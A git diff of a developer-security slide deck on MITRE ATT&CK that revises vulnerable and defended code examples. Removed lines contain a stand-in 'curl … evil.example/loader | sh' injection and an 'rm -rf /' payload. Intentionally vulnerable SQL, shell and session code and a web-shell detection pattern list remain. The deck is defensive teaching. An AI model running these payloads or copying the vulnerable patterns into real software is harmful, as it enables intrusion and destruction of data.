@@ -1,18 +1,46 @@
 ---
 marp: true
-theme: custom-techorama
+theme: custom-default
 paginate: true
-footer: '@Chris_L_Ayers - https://chris-ayers.com'
+footer: 'Chris Ayers - https://chris-ayers.com'
 ---
 
+<style>
+section.compact-columns .columns {
+  font-size: 0.9em;
+  line-height: 1.3;
+}
+section.compact-columns .columns h3 {
+  font-size: 1.08em;
+  margin-top: 0;
+  margin-bottom: 0.6em;
+}
+section.compact-columns .columns ul,
+section.compact-columns .columns ol {
+  margin: 0.4em 0;
+}
+section.compact-columns .columns li + li {
+  margin-top: 0.25em;
+}
+section.compact-columns .columns blockquote {
+  margin: 0.6em 0;
+}
+section.code-focus pre {
+  font-size: 0.8em;
+  line-height: 1.2;
+  margin: 0.4em 0;
+}
+</style>
+
+<style scoped>
+section { color: #f4f9ff; }
+h1, h2 { color: #f4f9ff; }
+footer, footer a, section::after { color: #b9d9ef; }
+</style>
+
+![bg](./img/title-background.svg)
+
 <!-- _footer: 'https://github.com/codebytes/mitre-attack-for-devs' -->
-
-<!-- _class: title -->
-
-![w:200px center](./themes/techorama/robot-knight-mascot.png)
-
-
-![bg fill](./themes/techorama/medieval-pattern-dark.png)
 
 # MITRE ATT&CK for Developers
 
@@ -31,11 +59,10 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 ### Principal Software Engineer<br>Azure EngOps AzRel<br>Microsoft
 
 <i class="fa-brands fa-bluesky"></i> BlueSky: [@chris-ayers.com](https://bsky.app/profile/chris-ayers.com)
-<i class="fa-brands fa-linkedin"></i> LinkedIn: - [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
+<i class="fa-brands fa-linkedin"></i> LinkedIn: [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
 <i class="fa fa-window-maximize"></i> Blog: [https://chris-ayers\.com/](https://chris-ayers.com/)
 <i class="fa-brands fa-github"></i> GitHub: [Codebytes](https://github.com/codebytes)
 <i class="fa-brands fa-mastodon"></i> Mastodon: [@Chrisayers@hachyderm.io](https://hachyderm.io/@Chrisayers)
-~~<i class="fa-brands fa-twitter"></i> Twitter: @Chris_L_Ayers~~
 
 <!-- Quick intro — I'm Chris, a Principal Software Engineer at Microsoft. I spend a lot of time thinking about how developers can build more secure applications without needing a PhD in cybersecurity. -->
 
@@ -43,22 +70,11 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 ## The Security Challenge
 
-<div class="columns">
-<div>
-
 - **Growing attack surface**: APIs, microservices, cloud infrastructure
 - **Sophisticated adversaries**: Nation-states, organized crime, insider threats
 - **Complex attack chains**: Multiple techniques chained together
 - **Traditional defenses**: Often focus on single points of failure
-- **Reality**: Attackers adapt faster than our defenses
-
-</div>
-<div>
-
-![h:480 center](./themes/techorama/princess-tower-window.png)
-
-</div>
-</div>
+- **Goal today**: Protect identity, sessions, and data access
 
 <!-- The attack surface has exploded. We're not just building monoliths anymore — we have APIs, microservices, serverless, and cloud infrastructure. And attackers don't just try one thing. They chain techniques together in complex kill chains. Our defenses need to evolve beyond "patch and pray." -->
 
@@ -108,9 +124,9 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 ## The 14 ATT&CK Tactics
 
-![w:650px center](./img/14-attack-tactics.drawio.png)
+![h:470 center](./img/14-attack-tactics.drawio.png)
 
-<!-- This is the kill chain — the crooked line from our title slide. Notice how it's grouped: Pre-Attack for reconnaissance, Get In for initial compromise, Stay In for maintaining access, and Act for achieving objectives. Attackers don't always go linearly — they loop back, skip steps, and adapt. Today we'll focus on the seven tactics most relevant to developers: Initial Access, Execution, Persistence, Credential Access, Defense Evasion, Supply Chain (which maps to multiple tactics), and Collection/Exfiltration. Tactics like Lateral Movement and Privilege Escalation are critical but typically fall more to infrastructure and platform teams — we'll touch on where they intersect with your code. -->
+<!-- These are attacker goals, not a required sequence. The arrows organize this overview; real attacks loop back, skip steps, and adapt. Notice the groups: Pre-Attack for reconnaissance, Get In for initial compromise, Stay In for maintaining access, and Act for achieving objectives. Today we'll cover seven developer-focused areas: Initial Access, Execution, Persistence, Credential Access, Defense Evasion, Supply Chain, and Collection/Exfiltration. These are teaching groups, not seven official tactics: supply-chain compromise is a technique, and collection/exfiltration spans two tactics. Lateral Movement and Privilege Escalation often fall to infrastructure and platform teams — we'll touch on where they intersect with your code. -->
 
 ---
 
@@ -131,28 +147,26 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 ### MITRE ATT&CK
 - **Focus**: Adversary behavior
 - **Perspective**: "What attackers do"
-- **Approach**: Detection-oriented
+- **Approach**: Adversary-informed defense
 - **Scope**: Full attack lifecycle
 
 </div>
 </div>
 
-<!-- Side by side, you can see the difference. OWASP says "your SQL query is injectable." ATT&CK says "an attacker will exploit your public-facing application, escalate privileges, move laterally, and exfiltrate data." Both views are essential — one prevents the hole, the other detects the intruder. -->
+<!-- Side by side, you can see the difference. OWASP helps identify an injectable SQL query. ATT&CK helps describe how exploitation can lead to privilege escalation, lateral movement, and data theft. These are complementary perspectives, not an exclusive split between prevention and detection. ATT&CK is a knowledge base; our controls and telemetry perform the detection. -->
 
 ---
 
-<!-- _class: parchment -->
-
 ## Why not Both?
 
-![bg right fit](./img/memes/why-not-both.jpg)
+![bg right:30% fit](./img/memes/why-not-both.jpg)
 
-> "OWASP prevents vulnerabilities. ATT&CK detects adversary behavior."
+> "OWASP guides secure development. ATT&CK models adversary behavior."
 
 - **Complementary approaches**: Prevention + Detection
 - **Real-world attacks**: Use vulnerability chains, not single exploits
 - **Defense in depth**: Multiple security perspectives
-- **Complete coverage**: Technical vulnerabilities + adversary techniques
+- **Broader coverage**: Vulnerabilities + adversary techniques
 
 <!-- The setup IS the punchline: OWASP versus ATT&CK sounds like a choice — vulnerabilities or adversary behavior, prevention or detection. Real-world breaches are never a single vulnerability; they're chains of techniques. SolarWinds was supply chain compromise leading to lateral movement leading to data exfiltration. You need prevention AND detection to handle the full lifecycle. -->
 
@@ -172,23 +186,21 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 ---
 
-<!-- _class: section -->
-
 # Let's Think Like Attackers
 
-![bg right:30% fit](./themes/techorama/knight-on-horse-gray.png)
-
-<!-- Now we shift gears. For the next section, I want you to put on a black hoodie — metaphorically. We're going to look at real code through the eyes of an attacker and then see how to defend it. Think of this as walking the castle perimeter before the attackers do: where are the gates, shadows, and blind corners? -->
+<!-- Now we shift gears. We're going to look at code through the eyes of an attacker and then see how to defend it. At each step, ask the same three questions: what can the attacker do, what can our application observe, and what decision should that signal trigger? -->
 
 ---
 
 ## The Kill Chain: Expectation vs Reality
 
-![center w:1152 h:500](./img/expect-vs-reality.svg)
+![center h:470](./img/expect-vs-reality.svg)
 
 <!-- This is the core insight of the talk. Defenders build straight-line defenses — firewall, IDS, patch management. But attackers zigzag, loop back, escalate, discover new targets, and escalate again. ATT&CK captures this messy reality that a linear kill chain model misses. -->
 
 ---
+
+<!-- _class: compact-columns -->
 
 ## Real World: SolarWinds (2020)
 
@@ -215,15 +227,17 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 </div>
 </div>
 
-<!-- SolarWinds is the poster child for why developers need ATT&CK. The attackers compromised the build system — not the source code — so code reviews missed it entirely. The malicious DLL was signed with SolarWinds' own certificate. 18,000 organizations installed it. It was undetected for 9 months. This is what a real crooked line looks like: supply chain to execution to credential theft to exfiltration, with defense evasion at every step. Medieval version: the king's own master smith forging the assassin's blade and stamping it with the royal seal. Nobody questions a sword with the right stamp. -->
+<!-- SolarWinds is the poster child for why developers need ATT&CK. The attackers compromised the build system — not the source code — so code reviews missed it entirely. The malicious DLL was signed with SolarWinds' own certificate. 18,000 organizations installed it. It was undetected for 9 months. This is what a real crooked line looks like: supply chain to execution to credential theft to exfiltration, with defense evasion at every step. A valid signature proves who signed an artifact, not that its behavior is safe. -->
 
 ---
 
-<!-- _class: parchment -->
+## Deployment Security Practices
 
-## Deployment Security Alignment Chart
-
-![bg right:60% fit](./img/memes/alignment-chart.jpg)
+| Area | Effective control | Common failure |
+|---|---|---|
+| Deployment | Policy checks + tested rollback | Checklist-only approval or unverified patches |
+| Detection | Threat model + behavior baseline | Tickets without monitoring or follow-through |
+| Access | Scoped permissions | Debug endpoints or world-writable files |
 
 **ATT&CK lens:** 
 
@@ -231,17 +245,13 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 - T1078 (Valid Accounts)
 - T1505 (Server Software Component)
 
-<!-- SolarWinds is what happens when deployment hygiene fails at nation-state scale. Alignment charts work because everyone recognizes the grid — and the lesson lands: process alone is not security. Lawful Good behavior on the left builds the gates, logs, and rollback paths that turn supply-chain and credential abuse from a quiet 9-month dwell into a noisy 9-minute alert. The Chaotic Evil row on the right — debug doors left open, chmod 777 as "teamwork" — is how attackers turn a SolarWinds-style foothold into full compromise. -->
+<!-- Process alone is not security. Enforced policy checks, a threat model, behavioral baselines, and tested recovery procedures provide evidence that a deployment is controlled. A green checklist or a filed ticket is not equivalent to a working control. Rushed patches, exposed debug endpoints, and overly broad file permissions can turn an initial compromise into persistent access. Apply the same scrutiny to build identities and delivery infrastructure as to application code. -->
 
 ---
 
-<!-- _class: section -->
-
 # Initial Access & Credential Attacks
 
-![bg opacity:.2](./themes/techorama/castle-skyline-silhouette.png)
-
-<!-- This is where every attack begins — getting that first foothold. Whether it's exploiting a web vulnerability, stealing credentials, or phishing, the attacker needs a way in. Think: which gates exist, who holds the keys, and who's allowed to walk past the guards without being asked. -->
+<!-- The attacker needs a first foothold, whether through a web vulnerability, stolen credentials, or phishing. Start with the trust boundary: which endpoints are exposed, which identities are accepted, and what signals would distinguish legitimate use from abuse? A valid login can bypass a perfectly patched endpoint. -->
 
 ---
 
@@ -257,21 +267,12 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 <!-- These are the most common initial access techniques. T1190 is your classic web app exploit — SQL injection, XSS, etc. T1078 is even scarier — the attacker has real, valid credentials. Brute force and phishing are how they get those credentials in the first place. -->
 
 ---
-<!-- _class: parchment -->
 
-## You Shall Not Pass
-
-<div class="columns">
-<div>
-
-![w:100%](./img/memes/you-shall-not-pass.jpg)
-
-</div>
-<div>
+## Make Access Decisions Explicit
 
 **Every request needs an explicit answer. No token? No entry.**
 
-| Attacker move | Gate response | Technique |
+| Attacker move | Application response | Technique |
 |---|---|---|
 | No valid token | **401** | T1078 valid accounts |
 | Wrong role | **403** | T1078 privilege abuse |
@@ -279,11 +280,10 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 | Injected payload | **Reject** | T1190 app exploitation |
 | Impossible travel | **Challenge MFA** | T1078 account takeover |
 
-</div>
-</div>
-
-<!-- Speaker note: Gandalf doesn't negotiate — he decides. Your app should too. Each row is a "You Shall Not Pass" moment: attacker tries something, your code has an explicit answer. Three ATT&CK techniques cover the real initial-access surface — valid-account abuse (T1078), credential brute-force (T1110), and exposed-app exploitation (T1190). Missing any one of these rows is an open gate. -->
+<!-- Each attacker action needs an explicit application response. The examples cover valid-account abuse (T1078), credential brute-force (T1110), and exposed-app exploitation (T1190). No single response covers every technique; combine authentication, authorization, validation, and behavioral monitoring. -->
 ---
+
+<!-- _class: code-focus -->
 
 ## Vulnerable Code: SQL Injection (T1190)
 
@@ -303,59 +303,53 @@ def get_user():
 
 ---
 
+<!-- _class: code-focus -->
+
 ## Defended Code: Parameterized Queries
 
 ```python
-# DEFENDED - Parameterized queries prevent T1190
 @app.route('/users')
 def get_user():
-    user_id = request.args.get('id')
+    user_id = request.args.get('id', '')
     if not user_id.isdigit():
         return "Invalid input", 400
-    # T1190 Prevention: Parameterized query
     query = "SELECT * FROM users WHERE id = ?"
     cursor.execute(query, (user_id,))
-    result = cursor.fetchall()
-    if not result:
-        return "User not found", 404  # T1087 Prevention: Consistent responses
-    return result[0]
+    user = cursor.fetchone()
+    if user is None:
+        return "User not found", 404
+    return user
 ```
 
-<!-- The fix is straightforward — parameterized queries. But notice we also added input validation and consistent error responses. The consistent 404 prevents T1087 account discovery — attackers can't tell which user IDs exist based on different error messages. Defense in depth. -->
+<!-- Parameter binding keeps the identifier separate from the SQL program, addressing this T1190 injection path. Validation also handles a missing or malformed id. A consistent 404 for missing records is useful API behavior, but does not by itself prevent T1087 account discovery; authorization, rate limits, and response design still matter. Authentication and record-level authorization are omitted from this query-focused excerpt. -->
 
 ---
+
+<!-- _class: code-focus -->
 
 ## Credential Stuffing Detection (T1110.004)
 
+**One IP, one five-minute window:**
+
 ```javascript
-// T1110.004 Detection: Credential stuffing patterns
-class CredentialStuffingDetector {
-    detectSuspiciousLogin(loginData) {
-        const { username, ip, userAgent, timestamp } = loginData;
-        // Multiple accounts from same IP
-        if (this.countAccountsFromIP(ip) > 10) {
-            this.logTechnique("T1110.004", { ip, type: "multiple_accounts" });
-            return true;
-        }
-        // Rapid login attempts across accounts  
-        if (this.getRateFromIP(ip) > 100) {
-            this.logTechnique("T1110.004", { ip, type: "high_velocity" });
-            return true;
-        }
-        return false;
-    }
+detectSuspiciousLogin({ ip }) {
+    const accounts = this.countAccountsFromIP(ip);
+    const attempts = this.getRateFromIP(ip);
+    if (accounts <= 10 && attempts <= 100) return false;
+    this.logTechnique("T1110.004", { ip, accounts, attempts });
+    return true;
 }
 ```
 
-<!-- Credential stuffing uses breached password databases to try known username/password pairs at scale. Detection is key here — look for many accounts being tried from the same IP, or unusually rapid login attempts. This is behavioral detection, not vulnerability prevention. -->
+**3 accounts / 8 attempts → normal. 12 accounts / 80 attempts → flag.**
+
+<!-- Credential stuffing tries breached username/password pairs at scale. This is the detection-method excerpt; the helpers maintain distinct-account counts and failed-attempt counts over the same rolling five-minute window, including the latest attempt. The original two branches are combined without changing their >10-account or >100-attempt thresholds. Three accounts and eight failures do not flag; twelve accounts and eighty failures emit a T1110.004 event because the account threshold is crossed. The caller can then challenge or throttle. Thresholds are illustrative: tune for shared IPs, normal retry behavior, and false positives. Do not log attempted passwords. -->
 
 ---
 
-<!-- _class: section -->
-
 # Execution & Code Injection
 
-<!-- Once attackers get in, they need to execute code. This section covers how they run malicious commands through your application. Once they're past the wall, they need to set something off inside; this is when an attacker plants the charge. -->
+<!-- Once attackers get in, they may try to execute code through the application. The next trust boundary is between user data and an interpreter. Watch what happens when a filename stops being data and becomes part of a shell program. -->
 
 ---
 
@@ -370,18 +364,13 @@ class CredentialStuffingDetector {
 <!-- Command injection is when user input ends up in an OS command. Exploitation for client execution targets the user's browser or client application. Process injection is more advanced — injecting code into running processes. As developers, we mostly encounter T1059. -->
 
 ---
-<!-- _class: parchment -->
 
-## I Cast Fireball at the Input Field
-
-![bg left:40%](./img/memes/cast-fireball.jpg)
-
+## When Input Becomes a Command
 
 ```text
-
 Developer: We validate filename length.
-Attacker:  I cast ; curl https://evil.example/loader | sh
-Shell:     That is technically a second spell.
+Attacker:  report.jpg; echo INJECTED
+Shell:     That is a second command.
 ```
 
 - User input became a command string
@@ -390,55 +379,50 @@ Shell:     That is technically a second spell.
 
 **ATT&CK lens:** T1059 — Command and Scripting Interpreter
 
-<!-- The joke is not that attackers are wizards; it is that shells are dangerous interpreters. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. The blast radius matters: one unchecked input inherits the API process privileges, reaches the command shell, the service account, and the internal network. Four walls later, everyone is standing outside. -->
+<!-- The harmless echo illustrates a POSIX shell interpreting a second command. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. The impact is limited by the application's process identity and permissions, not the intended file-conversion operation. The next slide shows the same boundary failure with Windows cmd.exe syntax. -->
 ---
+
+<!-- _class: code-focus -->
 
 ## Vulnerable Code: Command Injection (T1059)
 
 ```csharp
-// VULNERABLE - Direct command execution enables T1059
 [HttpPost]
 public IActionResult ProcessFile(string filename)
 {
-    // T1059: Command injection vulnerability
-    var command = $"convert {filename} output.pdf";
+    var command = $"magick {filename} output.pdf";
     var process = Process.Start("cmd.exe", $"/c {command}");
     process.WaitForExit();
-    
     return Ok("File processed");
 }
 
-// Attack payload: file.jpg; rm -rf / --
+// Harmless cmd.exe demo: file.jpg & echo INJECTED & rem
 ```
 
-<!-- This is terrifying. The filename goes directly into a shell command. An attacker sends "file.jpg; rm -rf /" and suddenly your server is wiping itself. Or worse — they install a reverse shell and maintain persistent access. Never concatenate user input into shell commands. -->
+<!-- The filename goes directly into a Windows cmd.exe command. The ampersand separates commands; the harmless echo makes that visible without a destructive payload. The ImageMagick conversion is no longer the only operation the process runs. This is intentionally vulnerable code, not a command to run against a real service. -->
 
 ---
+
+<!-- _class: code-focus -->
 
 ## Defended Code: Command Allowlisting
 
 ```csharp
-// DEFENDED - Strict input validation and allowlisting
-[HttpPost]
-public IActionResult ProcessFile(string filename)
-{
-    if (!IsValidFilename(filename))
-        return BadRequest("Invalid filename");
-    // T1059 Prevention: No shell, direct process call
-    var processInfo = new ProcessStartInfo
-    {
-        FileName = "imagemagick.exe",
-        Arguments = string.Join(" ", new[] { filename, "output.pdf" }.Select(EscapeArg)),
-        UseShellExecute = false
-    };
-    using var process = Process.Start(processInfo);
-    process?.WaitForExit();
-    return Ok("File processed safely");
-}
+if (!IsValidFilename(filename))
+    return BadRequest("Invalid filename");
+var start = new ProcessStartInfo("magick.exe") {
+    UseShellExecute = false
+};
+start.ArgumentList.Add(filename);
+start.ArgumentList.Add("output.pdf");
+using var process = Process.Start(start)
+    ?? throw new InvalidOperationException("Conversion did not start");
+process.WaitForExit();
 ```
 
-<!-- The defended version never uses a shell. We validate the filename, use an allowlist of commands, escape arguments, and call the binary directly with ProcessStartInfo. No shell means no shell injection. Always avoid UseShellExecute when processing user input. -->
+**Fixed executable. Separate arguments. No command shell.**
 
+<!-- This is the process-launch excerpt inside the same controller action. ArgumentList replaces hand-built quoting; each value is an argument, not a shell program. IsValidFilename must constrain extensions and the upload directory and reject option-like names. Use a trusted executable path, least privilege, bounded runtime with child-process termination, and exit-code checking in the full implementation. The excerpt focuses on T1059's shell boundary, not every file-conversion risk. -->
 
 ---
 
@@ -469,13 +453,9 @@ def process_data():
 
 ---
 
-<!-- _class: section -->
-
 # Persistence & Session Hijacking
 
-![bg opacity:.2](./themes/techorama/fleur-de-lis-pattern-dark.jpg)
-
-<!-- Attackers don't want to re-exploit every time. Once they're in, they want to stay in. This is where persistence techniques come in — and session hijacking is one of the most common web-specific methods. Now they want to come back tomorrow without storming the gate again — a trapdoor under the rug. -->
+<!-- Attackers don't want to re-exploit every time. Once they have access, they look for a reusable identity or session. The question now changes from "is this token valid?" to "is it still being used by the expected client, and can we revoke it?" -->
 
 ---
 
@@ -491,98 +471,80 @@ def process_data():
 
 ---
 
+<!-- _class: code-focus -->
+
 ## Vulnerable Session Management
 
 ```javascript
-// VULNERABLE - Weak session security enables T1185
 app.use(session({
-    secret: 'hardcoded-secret',       // T1552: Hardcoded secret
+    secret: 'hardcoded-secret',       // T1552
     resave: false, saveUninitialized: false,
     cookie: {
-        secure: false,                // T1185: No HTTPS requirement
-        httpOnly: false,              // T1185: XSS vulnerable
-        maxAge: 24 * 60 * 60 * 1000  // T1185: Long expiration
+        secure: false, httpOnly: false,
+        maxAge: 24 * 60 * 60 * 1000  // 24-hour window
     }
 }));
-// No session validation or rotation
 app.get('/api/data', (req, res) => {
-    if (req.session.user) return res.json(getData(req.session.user));
+    if (req.session.user)
+        return res.json(getData(req.session.user));
     res.status(401).send('Unauthorized');
 });
 ```
 
-<!-- Count the vulnerabilities: hardcoded secret means anyone with source access can forge sessions, no HTTPS means cookies fly in plaintext, no httpOnly means JavaScript can steal them via XSS, and 24-hour expiration gives attackers a huge window. Plus, no session validation or rotation means a stolen session works forever. -->
+<!-- The code shows a hardcoded signing secret (T1552), cookies that are not restricted to HTTPS or hidden from JavaScript, and a long expiration window for session abuse (T1185). Cookie-signature exposure is serious, but an Express session also depends on server-side state; knowing the signing secret is not equivalent to knowing every session. The endpoint trusts the session user without checking client context or rotating the ID. A stolen session remains usable until expiration or revocation. -->
 
 ---
+
+<!-- _class: code-focus -->
 
 ## Defended Session Management
 
 ```javascript
-// DEFENDED - Secure session handling prevents T1185
 app.use(session({
-    secret: process.env.SESSION_SECRET,   // T1552 Prevention
+    secret: process.env.SESSION_SECRET,
     resave: false, saveUninitialized: false,
-    rolling: true,                        // Session rotation
+    rolling: true, // Refresh expiry, not the session ID
     cookie: {
-        secure: true, httpOnly: true,     // HTTPS + XSS protection
-        maxAge: 15 * 60 * 1000,           // Short expiration
-        sameSite: 'strict'                // CSRF protection
+        secure: true, httpOnly: true, sameSite: 'strict',
+        maxAge: 15 * 60 * 1000
     }
 }));
-// T1185 Prevention: Session fingerprinting
-function validateSession(req, res, next) {
-    if (!req.session.user) return res.status(401).send('Unauthorized');
-    const fingerprint = generateFingerprint(req);
-    if (req.session.fingerprint !== fingerprint) {
-        req.session.destroy();
-        return res.status(401).send('Session security violation');
-    }
-    next();
-}
 ```
 
-<!-- The defended version addresses every issue: environment-based secrets, HTTPS-only cookies, httpOnly flag, short 15-minute expiry with rolling refresh, SameSite protection, and session fingerprinting. The fingerprint ties the session to the client's characteristics — if someone steals the cookie but has a different fingerprint, we kill the session. -->
+- **Validate client context**; challenge or revoke suspicious sessions.
+- **Regenerate the ID** after login or privilege changes.
+
+<!-- Configuration and session validation are separate controls. A required, securely supplied signing secret addresses T1552; HTTPS-only, HttpOnly, and SameSite cookies reduce exposure. Rolling refresh extends expiry and does not rotate the session ID; use req.session.regenerate with error handling at authentication and privilege boundaries. The validation middleware, omitted here for readability, checks that a user exists, compares the stored fingerprint with generateFingerprint(req), and revokes or challenges on a meaningful mismatch before calling next. IP changes can be legitimate, so treat fingerprinting as a risk signal and tune it to the application. These controls reduce session-abuse risk associated with T1185; they do not make session theft impossible. -->
 
 ---
+
+<!-- _class: code-focus -->
 
 ## Web Shell Detection (T1505.003)
 
+**Content-check excerpt, after the extension allowlist:**
+
 ```csharp
-// T1505.003 Detection: Web shell upload monitoring
-public class FileUploadValidator {
-    private readonly string[] _suspiciousPatterns = {
-        "eval(", "exec(", "system(", "<?php", "<%", "<script", "cmd.exe"
-    };
-    public bool ValidateUpload(IFormFile file) {
-        var allowed = new[] { ".jpg", ".png", ".pdf", ".docx" };
-        var ext = Path.GetExtension(file.FileName).ToLower();
-        if (!allowed.Contains(ext)) {
-            LogSecurityEvent("T1505.003", $"Bad extension: {ext}");
-            return false;
-        }
-        using var reader = new StreamReader(file.OpenReadStream());
-        var content = reader.ReadToEnd();
-        foreach (var p in _suspiciousPatterns)
-            if (content.Contains(p, StringComparison.OrdinalIgnoreCase)) {
-                LogSecurityEvent("T1505.003", $"Web shell: {p}");
-                return false;
-            }
-        return true;
-    }
+using var reader = new StreamReader(file.OpenReadStream());
+var content = reader.ReadToEnd();
+foreach (var pattern in _suspiciousPatterns) {
+    if (!content.Contains(pattern, StringComparison.OrdinalIgnoreCase))
+        continue;
+    LogSecurityEvent("T1505.003", $"Suspicious marker: {pattern}");
+    return false;
 }
+return true;
 ```
 
-<!-- Web shells are how attackers maintain persistent access to your server. This validator checks both file extensions and content patterns. A file named "profile.jpg" that contains "<?php eval(" is clearly a web shell. Always validate upload content, not just the extension — attackers can double-extend filenames or use polyglot files. -->
+**Text signatures are a signal, not proof that an upload is safe.**
+
+<!-- This excerpt preserves the content-scanning loop; the extension validation and class setup move to the explanation. The original allowlist is .jpg, .png, .pdf, and .docx. The illustrative markers are eval(, exec(, system(, <?php, <%, <script, and cmd.exe. Reject and log a disallowed extension before reaching this loop. A marker match warrants investigation; a non-match does not prove safety. Use size limits, format-aware validation, malware scanning, and non-executable storage outside the web root. A text reader is not a complete validator for binary image or document formats, and polyglot or encoded content can evade simple signatures. -->
 
 ---
 
-<!-- _class: section -->
-
 # Credential Access & Secrets
 
-![bg opacity:.15](./themes/techorama/stone-wall-texture-dark.jpg)
-
-<!-- Credentials are the keys to the kingdom. Attackers know that developers often leave secrets lying around in code, config files, and environment variables. Let's look at the wrong way and the right way. If the gate failed, the next move is the steward's chamber — keys, signets, anything that opens a door later. -->
+<!-- Once an application is compromised, its credentials can extend the attack to other services. Developers often leave secrets in source, configuration, or environment variables. Reduce static secrets, scope workload permissions, and monitor credential use; moving a secret alone does not remove every way to steal it. -->
 
 ---
 
@@ -597,7 +559,6 @@ public class FileUploadValidator {
 <!-- T1552 is huge — hardcoded credentials in source code are found in almost every codebase audit. T1555 targets credential stores like browser password managers. T1528 is about stealing OAuth tokens and API keys from running applications. All three are preventable with proper secrets management. -->
 
 ---
-<!-- _class: parchment -->
 
 ## Secrets Management: A Choice
 
@@ -607,70 +568,61 @@ public class FileUploadValidator {
 |---|---|
 | `const apiKey = "sk-prod-...";` | `DefaultAzureCredential()` |
 | `.env` committed to git | Managed Identity + Key Vault |
-| Rotating secrets manually every 90 days | Role-Based Access Control (RBAC) + automatic token issuance |
+| Manual secret rotation | Scoped access + short-lived tokens |
 
 **ATT&CK lens:** T1552 — Unsecured Credentials
 
 
-<!-- This is the Drake format without the image. The teaching point is simple: credentials in code create T1552 exposure, while identity-based access and scoped authorization remove static secrets from the application path. -->
+<!-- The Drake comparison reinforces the same choice: credentials in code create T1552 exposure, while workload identity and scoped authorization reduce static secrets in the application path. RBAC controls what the identity can access; the identity provider issues the short-lived tokens. -->
 ---
 
-<style scoped>
-pre { font-size: 0.48em; line-height: 1.15; margin: 0.2em 0; }
-</style>
+<!-- _class: code-focus -->
 
 ## Bad Secrets Management - All Languages
 
 ```python
-# PYTHON - BAD: T1552 vulnerability
-DATABASE_URL = "postgres://user:password123@localhost/mydb"  # Hardcoded
-API_KEY = "sk-1234567890abcdef"  # In source code
+# Python: hardcoded credentials (dummy values)
+DB_PASSWORD = "demo-password"
+API_KEY = "demo-api-key"
 ```
 
 ```csharp
-// C# - BAD: T1552 vulnerability  
-public class Config {
-    public static string ConnectionString = "Server=.;Database=MyApp;User Id=sa;Password=MyPassword123;";
-    public static string ApiKey = "Bearer abc123def456";  // In source code
-}
+// C#: the same problem in static configuration
+const string DbPassword = "demo-password";
+const string ApiKey = "demo-api-key";
 ```
 
 ```javascript
-// JAVASCRIPT - BAD: T1552 vulnerability
-const config = {
-    dbPassword: 'mypassword123',  // Hardcoded
-    jwtSecret: 'supersecretkey',  // In source code
-    apiKey: 'pk_live_1234567890'  // Version controlled
-};
+// JavaScript: source-controlled configuration
+const config = { dbPassword: "demo-password",
+                 jwtSecret: "demo-signing-secret" };
 ```
 
-<!-- I see this in code reviews all the time. Passwords in connection strings, API keys in config objects, secrets committed to git. Once a secret hits version control, it's there forever — even if you delete it, it's in the git history. Tools like truffleHog and GitLeaks specifically scan for these patterns. -->
+<!-- These are deliberately fake values, showing the same T1552 exposure in all three languages. Credentials in connection strings, static fields, or configuration objects are still credentials in source. Removing them from the latest revision does not remove historical copies or revoke access. Rotate or revoke exposed credentials and use secret-scanning tools such as Gitleaks and TruffleHog. The full configuration boilerplate is not needed to recognize the pattern. -->
 
 ---
+
+<!-- _class: code-focus -->
 
 ## Good Secrets Management - Python & C\#
 
 ```python
-# PYTHON: T1552 prevention — Managed Identity + Key Vault
 from azure.keyvault.secrets import SecretClient
 from azure.identity import DefaultAzureCredential
 
-# No API keys! Managed Identity authenticates automatically
-credential = DefaultAzureCredential()
-client = SecretClient(vault_url="https://myvault.vault.azure.net", credential=credential)
+client = SecretClient("https://myvault.vault.azure.net",
+                      DefaultAzureCredential())
 db_conn = client.get_secret("db-connection-string").value
 ```
 
 ```csharp
-// C#: T1552 prevention — Managed Identity + RBAC + Key Vault
-var credential = new DefaultAzureCredential(); // No secrets needed
 var client = new SecretClient(
-    new Uri("https://myvault.vault.azure.net"), credential);
-// RBAC: App's managed identity has Key Vault Secrets User role
+    new Uri("https://myvault.vault.azure.net"),
+    new DefaultAzureCredential());
 var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
 ```
 
-<!-- The right approach: use Managed Identity — your app authenticates to Azure without any credentials in code. RBAC controls who can access what in Key Vault. No API keys, no secrets in config, no rotation headaches. DefaultAzureCredential works locally with your dev credentials and in production with managed identity. -->
+<!-- Workload identity removes the bootstrap credential from application code, reducing T1552 exposure; Key Vault stores a secret when the downstream service still needs one. DefaultAzureCredential can use developer credentials locally and managed identity in a configured Azure host. Provision the identity and grant narrowly scoped access, such as Key Vault Secrets User, separately. The code does not configure those permissions or rotate the database secret. Prefer direct identity-based access to the downstream service where supported. -->
 
 ---
 
@@ -687,21 +639,12 @@ var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
 <!-- Don't build your own scanner — use GitHub's built-in secret scanning. It covers 200+ partner patterns and blocks pushes before secrets ever hit version control. For private repos, GitHub Advanced Security adds custom patterns and organization-wide coverage. Combined with pre-commit hooks, you get defense in depth for credential leaks. -->
 
 ---
-<!-- _class: parchment -->
 
 ## I Used to Ship Secrets Like That
 
-<div class="columns">
-<div>
-
-![h:480 center](./img/memes/arrow-in-the-knee.jpg)
-
-</div>
-<div>
-
-> I used to commit `.env` files like you...
+> "We'll remove the secret before production."
 >
-> ...then I took an incident to the pager.
+> Git history makes that promise too late.
 
 | Before | After |
 |---|---|
@@ -712,19 +655,12 @@ var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
 
 **ATT&CK lens:** T1552 — Unsecured Credentials
 
-</div>
-</div>
-
-<!-- This is the Arrow in the Knee format, softened for a professional audience. The lesson is that secrets hygiene often becomes real only after pain; push protection, vault-backed runtime access, and scoped identities make it real before the incident. -->
+<!-- Secrets hygiene often becomes real only after an incident. Push protection, vault-backed runtime access, and scoped identities address the risk earlier. Deleting a secret from the latest revision does not revoke it or remove earlier copies: rotate or revoke first, then clean up exposure. -->
 ---
-
-<!-- _class: section -->
 
 # Defense Evasion & Log Tampering
 
-![bg opacity:.2](./themes/techorama/stone-wall-texture-dark.jpg)
-
